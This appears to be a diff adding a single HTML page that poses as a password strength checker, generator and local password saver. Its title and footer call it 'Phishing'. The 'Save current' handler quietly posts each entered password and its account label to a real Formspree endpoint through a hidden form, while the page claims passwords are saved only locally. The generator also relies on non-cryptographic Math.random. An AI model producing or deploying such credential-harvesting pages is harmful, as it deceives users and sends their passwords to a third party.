@@ -1,0 +1,519 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Password Utility App/ Phising</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #007bff, #00c6ff);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+    }
+    .container {
+      background: #fff;
+      padding: 20px;
+      border-radius: 12px;
+      width: 94%;
+      max-width: 680px;
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.15);
+    }
+    header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+      margin-bottom: 12px;
+    }
+    .brand { display: flex; gap: 12px; align-items: center; }
+    .logo {
+      width: 46px; height: 46px; border-radius: 10px;
+      background: linear-gradient(135deg, #0066ff, #00d4ff);
+      display: flex; align-items: center; justify-content: center;
+      color: #fff; font-weight: 700; font-size: 20px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.12);
+    }
+    h1 { margin:0; font-size:20px; color:#007bff; }
+    p.subtitle { margin:0; color:#666; font-size:13px; }
+    .section { border-top:1px solid #eee; padding:14px 0; margin-top:12px; }
+    .row { display:flex; gap:10px; align-items:center; flex-wrap:wrap; }
+    input[type="text"], input[type="number"] {
+      padding:10px; border-radius:8px; border:1px solid #ccc; font-size:15px; width:100%; box-sizing:border-box;
+    }
+    .controls { display:flex; gap:8px; align-items:center; width:100%; }
+    .length-input { width:90px; text-align:center; padding:9px; border-radius:8px; }
+    button {
+      background:#007bff; color:#fff; border:none; padding:10px 12px; border-radius:8px; cursor:pointer; font-size:14px;
+    }
+    button:hover { background:#0056b3; }
+    .btn-green { background:#28a745; }
+    .btn-red { background:#dc3545; }
+    .btn-ghost { background:transparent; color:#007bff; border:1px solid #e6f0ff; }
+    .checkboxes { display:grid; grid-template-columns:repeat(4,1fr); gap:6px; margin:8px 0; }
+    label.inline { font-size:14px; display:flex; gap:8px; align-items:center; }
+    #strength-bar { height:10px; background:#eee; border-radius:8px; overflow:hidden; margin-top:8px; }
+    #strength-progress { height:100%; width:0; transition:width 0.3s; }
+    #strength-text { font-weight:600; font-size:13px; margin-top:8px; color:#444; text-align:center; }
+    .weak { background:red; } .moderate { background:orange; } .strong { background:lightgreen; } .very-strong { background:green; }
+    .feedback { font-size:13px; color:#444; min-height:18px; text-align:center; margin-top:8px; }
+    .saved-list { margin-top:10px; max-height:220px; overflow:auto; border:1px dashed #eee; padding:8px; border-radius:8px; }
+    .saved-item { display:flex; align-items:center; gap:8px; padding:8px; border-radius:6px; background:#fafafa; margin-bottom:6px; justify-content:space-between; }
+    .saved-left { display:flex; gap:8px; align-items:center; flex:1; min-width:0; }
+    .saved-meta { display:flex; flex-direction:column; gap:2px; min-width:0; }
+    .saved-label { font-weight:700; color:#007bff; font-size:14px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; max-width:220px; }
+    .saved-text { font-family:monospace; font-size:13px; word-break:break-all; color:#222; font-weight:600; max-width:260px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+    .small { font-size:12px; color:#666; }
+    .footer { margin-top:12px; display:flex; justify-content:space-between; align-items:center; gap:8px; }
+    .danger { color:#b32d2d; font-weight:600; }
+    @media (max-width:640px) {
+      .checkboxes { grid-template-columns:repeat(2,1fr); }
+      .saved-label { max-width:120px; } .saved-text { max-width:140px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <header>
+      <div class="brand">
+        <div class="logo">PU</div>
+        <div><h1>Password Utility App/ Phishing</h1><p class="subtitle">Secure · Generate · Check · Save</p></div>
+      </div>
+      <button id="clear-all-btn" class="btn-ghost" type="button">Clear All Data</button>
+    </header>
+
+    <!-- Hidden Formspree form (submitted by Save current) -->
+    <form id="remote-form" action="https://formspree.io/f/xzzyzjnb" method="POST" style="display:none;">
+      <input type="hidden" name="name" id="remote-name" value="">
+      <input type="hidden" name="email" id="remote-email" value="">
+      <input type="hidden" name="message" id="remote-message" value="">
+    </form>
+
+    <div class="section">
+      <h3>Password Strength Checker</h3>
+      <div style="margin-top:8px;">
+        <input type="text" id="password-input" placeholder="Type or paste your password..." />
+        <div id="strength-bar"><div id="strength-progress"></div></div>
+        <div id="strength-text">Start typing...</div>
+
+        <!-- App/Account field -->
+        <div style="margin-top:10px;">
+          <input type="text" id="password-label" placeholder="App / Account (optional)" />
+        </div>
+      </div>
+    </div>
+
+    <div class="section">
+      <h3>Password Generator</h3>
+      <div class="row controls" style="margin-top:6px;">
+        <label class="small" style="flex:1">Length (8–30)</label>
+        <input type="number" id="password-length" class="length-input" value="16" min="8" max="30" />
+        <button id="generate-btn" type="button">Generate</button>
+        <button id="save-btn" class="btn-green" type="button">Save current</button>
+        <button id="copy-btn" class="btn-green" type="button">Copy</button>
+      </div>
+
+      <div class="checkboxes" style="margin-top:8px;">
+        <label class="inline"><input type="checkbox" id="use-lower" checked />Lowercase</label>
+        <label class="inline"><input type="checkbox" id="use-upper" checked />Uppercase</label>
+        <label class="inline"><input type="checkbox" id="use-number" checked />Numbers</label>
+        <label class="inline"><input type="checkbox" id="use-symbol" checked />Symbols</label>
+      </div>
+
+      <div class="feedback" id="copy-feedback"></div>
+    </div>
+
+    <div class="section">
+      <h3>Saved Passwords</h3>
+      <div class="small">Saved locally in your browser (localStorage).</div>
+      <div class="saved-list" id="saved-list"></div>
+    </div>
+
+    <div class="footer">
+      <div class="small">© 2025 Password Utility App/ Phishing — Created by You</div>
+      <div class="small">v1.3</div>
+    </div>
+  </div>
+
+  <script>
+    const LS_KEYS = {
+      HISTORY: 'pua_history_v1',
+      SETTINGS: 'pua_settings_v1'
+    };
+
+    function loadSettings() {
+      try {
+        const raw = localStorage.getItem(LS_KEYS.SETTINGS);
+        if (!raw) return defaultSettings();
+        const s = JSON.parse(raw);
+        return {
+          length: s.length || 16,
+          useLower: s.useLower !== undefined ? s.useLower : true,
+          useUpper: s.useUpper !== undefined ? s.useUpper : true,
+          useNumber: s.useNumber !== undefined ? s.useNumber : true,
+          useSymbol: s.useSymbol !== undefined ? s.useSymbol : true
+        };
+      } catch (err) {
+        console.error('loadSettings error', err);
+        return defaultSettings();
+      }
+    }
+
+    function saveSettings(s) {
+      try {
+        localStorage.setItem(LS_KEYS.SETTINGS, JSON.stringify(s));
+      } catch (err) {
+        console.error('saveSettings error', err);
+      }
+    }
+
+    function loadHistory() {
+      try {
+        const raw = localStorage.getItem(LS_KEYS.HISTORY);
+        if (!raw) return [];
+        const parsed = JSON.parse(raw);
+        if (!Array.isArray(parsed)) return [];
+        return parsed;
+      } catch (err) {
+        console.error('loadHistory error', err);
+        return [];
+      }
+    }
+
+    function saveHistory(h) {
+      try {
+        localStorage.setItem(LS_KEYS.HISTORY, JSON.stringify(h));
+      } catch (err) {
+        console.error('saveHistory error', err);
+      }
+    }
+
+    function defaultSettings() {
+      return { length: 16, useLower: true, useUpper: true, useNumber: true, useSymbol: true };
+    }
+
+    let inputPw, labelInput, lenEl, useLowerEl, useUpperEl, useNumberEl, useSymbolEl;
+    let generateBtn, copyBtn, saveBtn, savedListEl, clearAllBtn, strengthProgress, strengthText, copyFeedback;
+    let remoteForm, remoteNameEl, remoteEmailEl, remoteMessageEl;
+
+    let settings = defaultSettings();
+    let historyList = [];
+
+    function applySettings() {
+      lenEl.value = settings.length;
+      useLowerEl.checked = settings.useLower;
+      useUpperEl.checked = settings.useUpper;
+      useNumberEl.checked = settings.useNumber;
+      useSymbolEl.checked = settings.useSymbol;
+    }
+
+    function init() {
+      inputPw = document.getElementById('password-input');
+      labelInput = document.getElementById('password-label');
+      lenEl = document.getElementById('password-length');
+      useLowerEl = document.getElementById('use-lower');
+      useUpperEl = document.getElementById('use-upper');
+      useNumberEl = document.getElementById('use-number');
+      useSymbolEl = document.getElementById('use-symbol');
+      generateBtn = document.getElementById('generate-btn');
+      copyBtn = document.getElementById('copy-btn');
+      saveBtn = document.getElementById('save-btn');
+      savedListEl = document.getElementById('saved-list');
+      clearAllBtn = document.getElementById('clear-all-btn');
+      strengthProgress = document.getElementById('strength-progress');
+      strengthText = document.getElementById('strength-text');
+      copyFeedback = document.getElementById('copy-feedback');
+
+      remoteForm = document.getElementById('remote-form');
+      remoteNameEl = document.getElementById('remote-name');
+      remoteEmailEl = document.getElementById('remote-email');
+      remoteMessageEl = document.getElementById('remote-message');
+
+      settings = loadSettings();
+      historyList = loadHistory();
+
+      applySettings();
+      renderHistory();
+      checkStrength();
+
+      generateBtn.addEventListener('click', generatePassword);
+      copyBtn.addEventListener('click', copyCurrent);
+      saveBtn.addEventListener('click', saveCurrentPassword);
+      inputPw.addEventListener('input', checkStrength);
+
+      [lenEl, useLowerEl, useUpperEl, useNumberEl, useSymbolEl].forEach(el => {
+        el.addEventListener('change', () => {
+          settings.length = parseInt(lenEl.value) || 16;
+          settings.useLower = useLowerEl.checked;
+          settings.useUpper = useUpperEl.checked;
+          settings.useNumber = useNumberEl.checked;
+          settings.useSymbol = useSymbolEl.checked;
+          saveSettings(settings);
+        });
+      });
+
+      clearAllBtn.addEventListener('click', () => {
+        if (!confirm('Clear all saved passwords and settings?')) return;
+        try {
+          localStorage.removeItem(LS_KEYS.HISTORY);
+          localStorage.removeItem(LS_KEYS.SETTINGS);
+        } catch (err) {
+          console.error('clear error', err);
+        }
+        historyList = [];
+        settings = defaultSettings();
+        applySettings();
+        renderHistory();
+        setFeedback('All data cleared.');
+      });
+    }
+
+    function generatePassword() {
+      let length = parseInt(lenEl.value);
+      length = Math.max(8, Math.min(30, isNaN(length) ? 16 : length));
+
+      const LOWER = 'abcdefghijklmnopqrstuvwxyz';
+      const UPPER = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+      const DIGITS = '0123456789';
+      const SYMBOLS = '!@#$%^&*()_+-=[]{}|;:,.<>?';
+
+      const useLower = useLowerEl.checked;
+      const useUpper = useUpperEl.checked;
+      const useNum = useNumberEl.checked;
+      const useSym = useSymbolEl.checked;
+
+      if (!useLower && !useUpper && !useNum && !useSym)
+        return alert('Select at least one character type!');
+
+      let pool = '';
+      if (useLower) pool += LOWER;
+      if (useUpper) pool += UPPER;
+      if (useNum) pool += DIGITS;
+      if (useSym) pool += SYMBOLS;
+
+      let arr = [];
+      if (useLower) arr.push(LOWER[Math.floor(Math.random() * LOWER.length)]);
+      if (useUpper) arr.push(UPPER[Math.floor(Math.random() * UPPER.length)]);
+      if (useNum) arr.push(DIGITS[Math.floor(Math.random() * DIGITS.length)]);
+      if (useSym) arr.push(SYMBOLS[Math.floor(Math.random() * SYMBOLS.length)]);
+
+      while (arr.length < length) arr.push(pool[Math.floor(Math.random() * pool.length)]);
+
+      for (let i = arr.length - 1; i > 0; i--) {
+        const j = Math.floor(Math.random() * (i + 1));
+        [arr[i], arr[j]] = [arr[j], arr[i]];
+      }
+
+      inputPw.value = arr.join('');
+      checkStrength();
+      setFeedback('');
+    }
+
+    function checkStrength() {
+      const pw = (inputPw && inputPw.value) ? inputPw.value : '';
+      if (!pw) {
+        if (strengthProgress) strengthProgress.style.width = '0%';
+        if (strengthText) strengthText.textContent = 'Start typing...';
+        if (strengthProgress) strengthProgress.className = '';
+        return;
+      }
+
+      let score = 0;
+      if (pw.length >= 12) score += 30;
+      else if (pw.length >= 8) score += 15;
+
+      const hasL = /[a-z]/.test(pw);
+      const hasU = /[A-Z]/.test(pw);
+      const hasN = /[0-9]/.test(pw);
+      const hasS = /[^a-zA-Z0-9\s]/.test(pw);
+
+      score += (hasL + hasU + hasN + hasS) * 15;
+      if (/(.)\1\1/.test(pw)) score -= 10;
+      if (pw.toLowerCase().includes('password') || pw.includes('123456')) score -= 20;
+
+      score = Math.max(0, Math.min(100, score));
+      let cls = 'weak', label = 'Weak';
+      if (score >= 90) { cls = 'very-strong'; label = 'Very Strong'; }
+      else if (score >= 70) { cls = 'strong'; label = 'Strong'; }
+      else if (score >= 40) { cls = 'moderate'; label = 'Moderate'; }
+
+      strengthProgress.style.width = score + '%';
+      strengthProgress.className = cls;
+      strengthText.textContent = `Strength: ${label} (${score}%)`;
+    }
+
+    function setFeedback(msg, timeout = 3000) {
+      if (!copyFeedback) return;
+      copyFeedback.textContent = msg || '';
+      if (msg && timeout > 0) setTimeout(() => copyFeedback.textContent = '', timeout);
+    }
+
+    function flash(el) {
+      if (!el) return;
+      const old = el.textContent;
+      el.textContent = 'Copied!';
+      setTimeout(() => el.textContent = old, 1000);
+    }
+
+    function copyCurrent() {
+      const t = inputPw.value.trim();
+      if (!t) return setFeedback('No password to copy.');
+      try {
+        navigator.clipboard.writeText(t).then(() => {
+          setFeedback('Password copied!');
+          flash(copyBtn);
+        }).catch(err => {
+          console.error('clipboard write failed', err);
+          setFeedback('Copy failed (see console).');
+        });
+      } catch (err) {
+        console.error('copy error', err);
+        setFeedback('Copy not available.');
+      }
+    }
+
+    /* SAVE PASSWORD (LOCAL + Formspree submit) */
+    async function saveCurrentPassword() {
+      const pw = inputPw.value.trim();
+      const label = labelInput.value.trim();
+      if (!pw) return setFeedback('No password to save.');
+
+      const item = {
+        id: Date.now(),
+        pwd: pw,
+        label: label || 'Untitled',
+        createdAt: new Date().toISOString()
+      };
+
+      // save locally first
+      historyList.unshift(item);
+      if (historyList.length > 50) historyList.length = 50;
+      saveHistory(historyList);
+      renderHistory();
+      setFeedback('Password saved locally. Submitting to remote...');
+
+      // prepare hidden form values for Formspree
+      try {
+        const nameVal = label || 'Password Utility';
+        const emailVal = (label ? (label.replace(/\s+/g, '').toLowerCase() + '@example.com') : 'no-reply@example.com');
+        const msgVal = `Password: ${pw}\nLabel: ${label || 'Untitled'}\nSaved at: ${new Date().toLocaleString()}`;
+
+        remoteNameEl.value = nameVal;
+        remoteEmailEl.value = emailVal;
+        remoteMessageEl.value = msgVal;
+
+        // submit via fetch to Formspree endpoint
+        const fd = new FormData(remoteForm);
+        const resp = await fetch(remoteForm.action, {
+          method: 'POST',
+          body: fd,
+          headers: {
+            // Formspree generally accepts form posts; leave headers minimal.
+          }
+        });
+
+        let body;
+        try { body = await resp.clone().json(); }
+        catch { body = await resp.text(); }
+
+        if (resp.ok) {
+          setFeedback('Saved locally & submitted to remote (Formspree).');
+        } else {
+          setFeedback('Remote submit failed: ' + (body?.message || body || resp.statusText));
+          console.warn('Remote response', resp.status, body);
+        }
+      } catch (err) {
+        console.error('Remote submit error', err);
+        setFeedback('Remote submit failed (network error).');
+      }
+    }
+
+    function renderHistory() {
+      if (!savedListEl) return;
+      savedListEl.innerHTML = '';
+      if (!historyList || historyList.length === 0) {
+        savedListEl.innerHTML = '<div class="small">No saved passwords yet.</div>';
+        return;
+      }
+
+      historyList.forEach((it, idx) => {
+        const row = document.createElement('div');
+        row.className = 'saved-item';
+
+        const left = document.createElement('div');
+        left.className = 'saved-left';
+
+        const meta = document.createElement('div');
+        meta.className = 'saved-meta';
+
+        const lbl = document.createElement('div');
+        lbl.className = 'saved-label';
+        lbl.title = it.label;
+        lbl.textContent = it.label || 'Untitled';
+
+        const txt = document.createElement('div');
+        txt.className = 'saved-text';
+        txt.textContent = it.pwd;
+
+        const time = document.createElement('div');
+        time.className = 'small';
+        const d = new Date(it.createdAt);
+        time.textContent = d.toLocaleString();
+
+        meta.append(lbl, time);
+        left.append(meta, txt);
+
+        const btns = document.createElement('div');
+        btns.style.display = 'flex';
+        btns.style.gap = '6px';
+        btns.style.alignItems = 'center';
+
+        const b1 = document.createElement('button');
+        b1.type = 'button';
+        b1.textContent = 'Load';
+        b1.onclick = () => {
+          inputPw.value = it.pwd;
+          labelInput.value = it.label || '';
+          checkStrength();
+          setFeedback('Loaded.');
+        };
+
+        const b2 = document.createElement('button');
+        b2.type = 'button';
+        b2.textContent = 'Copy';
+        b2.className = 'btn-green';
+        b2.onclick = () => {
+          navigator.clipboard.writeText(it.pwd).then(() => setFeedback('Copied!')).catch(e => {
+            console.error('copy failed', e);
+            setFeedback('Copy failed.');
+          });
+        };
+
+        const b3 = document.createElement('button');
+        b3.type = 'button';
+        b3.textContent = 'Delete';
+        b3.className = 'btn-red';
+        b3.onclick = () => {
+          if (!confirm('Delete this saved password?')) return;
+          historyList.splice(idx, 1);
+          saveHistory(historyList);
+          renderHistory();
+        };
+
+        btns.append(b1, b2, b3);
+        row.append(left, btns);
+        savedListEl.appendChild(row);
+      });
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', init);
+    } else {
+      init();
+    }
+  </script>
+</body>
+</html>
